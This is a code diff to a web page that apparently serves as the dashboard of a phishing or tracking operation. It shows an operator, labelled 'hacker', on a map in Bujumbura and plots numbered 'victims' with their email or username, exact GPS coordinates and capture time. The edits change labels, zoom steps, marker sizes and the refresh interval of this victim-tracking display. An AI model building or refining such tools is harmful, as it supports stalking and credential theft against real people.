@@ -70,8 +70,8 @@ $op_lng = 29.359912;
     </div>
 
     <div class="zoom-controls">
-        <button class="zoom-btn" onclick="map.setZoom(map.getZoom() + 1)">🔍 Zoom +</button>
-        <button class="zoom-btn" onclick="map.setZoom(map.getZoom() - 1)">🔎 Zoom -</button>
+        <button class="zoom-btn" onclick="map.setZoom(map.getZoom() + 5)">🔍 Zoom +</button>
+        <button class="zoom-btn" onclick="map.setZoom(map.getZoom() - 5)">🔎 Zoom -</button>
         <button class="zoom-btn" onclick="map.fitBounds(bounds)">📐 Fit All</button>
     </div>
 
@@ -113,7 +113,7 @@ $op_lng = 29.359912;
                 html: '🟡 <strong>OP</strong>',
                 iconSize: [30, 30]
             })
-        }).addTo(map).bindPopup('<b>🚨 OPÉRATEUR Bujumbura</b><br>Position fixe');
+        }).addTo(map).bindPopup('<b>🚨 hacker </b><br>Position fixe');
         bounds.extend([opLat, opLng]);
 
         // VICTIMES MARKERS VISIBLE (rouges clignotants PRO)
@@ -122,13 +122,13 @@ $op_lng = 29.359912;
                 icon: L.divIcon({
                     className: 'victim-marker',
                     html: `🔴 #${index+1}`,
-                    iconSize: [25, 25],
+                    iconSize: [35, 35],
                     className: 'victim-marker'
                 })
             }).addTo(map).bindPopup(`
                 <div style="font-family: monospace; color: #ff0000;">
                     <h3>🎯 VICTIME #${index+1}</h3>
-                    <strong>📧 Email:</strong> ${victim.email}<br>
+                    <strong>📧 Email ou username :</strong> ${victim.email}<br>
                     <strong>📍 GPS:</strong> ${victim.lat.toFixed(6)}, ${victim.lng.toFixed(6)}<br>
                     <strong>🕒 Time:</strong> ${victim.time}
                 </div>
@@ -155,7 +155,7 @@ $op_lng = 29.359912;
         document.getElementById('victimCount').textContent = victims.length;
 
         // Auto-refresh PRO 5s
-        setInterval(() => { location.reload(); }, 500000);
+        setInterval(() => { location.reload(); }, 480000);
     </script>
 </body>
 </html>
